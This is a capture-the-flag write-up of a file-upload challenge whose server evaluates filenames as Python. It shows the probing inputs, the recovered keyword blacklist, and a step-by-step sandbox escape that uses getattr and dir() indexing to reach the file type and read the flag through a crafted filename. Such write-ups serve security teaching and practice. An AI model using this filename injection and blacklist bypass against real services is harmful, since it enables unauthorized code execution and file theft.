# The Most Secure File Uploader

1.png
54/306 = 18% of the teams solved this challenge.

## Phase: Reconnaissance
Here we need to figure out how the challenge works, and figure out what we can exploit.

2.png
Here we can see it's a file upload. File uploaders are often insecure, let's upload something.

6.png
3.png
We see that the URL say's it a php file, but the error message looks like python. This is probably just a trick to confuse you.

We know from this that it tries to do something with the filename, and we get a error. Let's upload something that does not end with a image extension (.jpg/.png etc).
4.png

Okay, uploading something other than `*.png` we get an error. Here we try upload some different payloads and see what the output is.

`hej.vad.png` =>   Traceback (most recent call last): File "", line 1, in NameError: name 'hej' is not defined
`0.png` =>         File "", line 1 0.png ^ SyntaxError: invalid syntax
`AAAA).png` =>     File "", line 1 AAAA).png ^ SyntaxError: invalid syntax
`$flag.png`  =>    File "", line 1 .png ^ SyntaxError: invalid syntax
`__debug__.png` => Traceback (most recent call last): File "", line 1, in AttributeError: 'bool' object has no attribute 'png'
`__debug__.__str__.png` => Traceback (most recent call last): File "", line 1, in AttributeError: 'method-wrapper' object has no attribute 'png'
`123456789[:-1].png` Traceback (most recent call last): File "", line 1, in TypeError: 'int' object has no attribute '__getitem__'

As you can see, when we did the CTF, we fell in the php trap and though the server was running php code. The more we tried, we noticed that it's definately python error messages.

And the breakthrough were when we added a # at the end to comment out the .png part as it seem to be failing on that line.
5.png

### Blacklist
As we try upload some known python names, like __class__.png 
7.png
...And there seem to be a blacklist.

Iterating over some known and `useful` python stuff we get the following blacklist:

`subprocesses|os|import|builtins|eval|locals|class|;|file` 

and the file must end with a .png.


## Phase: Exploit - Python sandbox escape
From the reconnisance phase we notice the challenge is a Python sandbox escape.
Usually the flag is hidden on the server in a .txt file, so our goal is to read a file.

`().__class__.__base__.__subclasses__()[40]("flag.txt").read()` 
Here is the line we want to execute, but from the reco phase we know that class, subclasses is blacklisted.
To circumvent this we need to figure out another way to run __class__ and __subclasses__ without actually typing it.

```
>>> dir([])[1]
'__class__'
```

Okay, we can now write the __class__ without directly typing it to bypass the blacklist.

```
>>> getattr((), dir([])[1])
<type 'tuple'>
```
This translates to `[].__class__`.

Okay so next we want to append __base__.

```
>>> getattr((), dir([])[1]).__base__
<type 'object'>
```
And now we want to append __subclassses__, but we know class is blacklisted so we have to bypass it somehow.

```
>>> dir(().__class__.__base__.__class__)
['__abstractmethods__', '__base__', '__bases__', '__basicsize__', '__call__', '__class__', '__delattr__', '__dict__', '__dictoffset__', '__doc__', '__eq__', '__flags__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__instancecheck__', '__itemsize__', '__le__', '__lt__', '__module__', '__mro__', '__name__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasscheck__', '__subclasses__', '__subclasshook__', '__weakrefoffset__', 'mro']
```
We've found the __subclasses__. Now we just have to write the same command without using class.

```
>>> dir(getattr(getattr(getattr((), dir([])[1]),'__base__'),  dir([])[1]))
['__abstractmethods__', '__base__', '__bases__', '__basicsize__', '__call__', '__class__', '__delattr__', '__dict__', '__dictoffset__', '__doc__', '__eq__', '__flags__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__instancecheck__', '__itemsize__', '__le__', '__lt__', '__module__', '__mro__', '__name__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasscheck__', '__subclasses__', '__subclasshook__', '__weakrefoffset__', 'mro']
```

Great! Let's extract what we want:
```
>>> dir(().__class__.__base__.__class__)[34]
'__subclasses__'
```

If we combine what we have so far:
```
getattr(getattr(getattr((), dir([])[1]),'__base__'),dir(getattr(getattr(getattr((), dir([])[1]),'__base__'),  dir([])[1]))[34])
<built-in method __subclasses__ of type object at 0x5610a5dd6980>
```

Adding () to call the __subclasses__ function.

```
>>> getattr(getattr(getattr((), dir([])[1]),'__base__'),dir(getattr(getattr(getattr((), dir([])[1]),'__base__'),  dir([])[1]))[34])()
[<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>, <type 'weakproxy'>, <type 'int'>, <type 'basestring'>, <type 'bytearray'>, <type 'list'>, <type 'NoneType'>, <type 'NotImplementedType'>, <type 'traceback'>, <type 'super'>, <type 'xrange'>, <type 'dict'>, <type 'set'>, <type 'slice'>, <type 'staticmethod'>, <type 'complex'>, <type 'float'>, <type 'buffer'>, <type 'long'>, <type 'frozenset'>, <type 'property'>, <type 'memoryview'>, <type 'tuple'>, <type 'enumerate'>, <type 'reversed'>, <type 'code'>, <type 'frame'>, <type 'builtin_function_or_method'>, <type 'instancemethod'>, <type 'function'>, <type 'classobj'>, <type 'dictproxy'>, <type 'generator'>, <type 'getset_descriptor'>, <type 'wrapper_descriptor'>, <type 'instance'>, <type 'ellipsis'>, <type 'member_descriptor'>, <type 'file'>, <type 'PyCapsule'>, <type 'cell'>, <type 'callable-iterator'>, <type 'iterator'>, <type 'sys.long_info'>, <type 'sys.float_info'>, <type 'EncodingMap'>, <type 'fieldnameiterator'>, <type 'formatteriterator'>, <type 'sys.version_info'>, <type 'sys.flags'>, <type 'exceptions.BaseException'>, <type 'module'>, <type 'imp.NullImporter'>, <type 'zipimport.zipimporter'>, <type 'posix.stat_result'>, <type 'posix.statvfs_result'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class '_abcoll.Hashable'>, <type 'classmethod'>, <class '_abcoll.Iterable'>, <class '_abcoll.Sized'>, <class '_abcoll.Container'>, <class '_abcoll.Callable'>, <type 'dict_keys'>, <type 'dict_items'>, <type 'dict_values'>, <class 'site._Printer'>, <class 'site._Helper'>, <type '_sre.SRE_Pattern'>, <type '_sre.SRE_Match'>, <type '_sre.SRE_Scanner'>, <class 'site.Quitter'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>]
>>> getattr(getattr(getattr((), dir([])[1]),'__base__'),dir(getattr(getattr(getattr((), dir([])[1]),'__base__'),  dir([])[1]))[34])()[40]
<type 'file'>
>>> 

Let's combine our payload and upload it to get the flag.
```mv payload.png "print getattr(getattr(getattr((), dir([])[1]),'__base__'),dir(getattr(getattr(getattr((), dir([])[1]),'__base__'),  dir([])[1]))[34])()[40]('flag').read()#.png"```


8.png
